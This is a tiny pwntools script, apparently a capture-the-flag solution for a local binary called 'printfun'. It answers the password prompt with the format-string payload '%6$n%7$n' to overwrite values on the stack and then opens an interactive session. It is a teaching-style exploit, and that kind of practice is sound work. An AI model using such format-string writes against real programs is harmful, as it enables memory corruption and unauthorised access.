from pwn import*
context(os='linux')
context.log_level = 'DEBUG'
e =ELF("./printfun")
io = process(e.path)
io.recvuntil("What's the password?")
io.sendline("%6$n%7$n")
#io.sendline(payload)
io.interactive()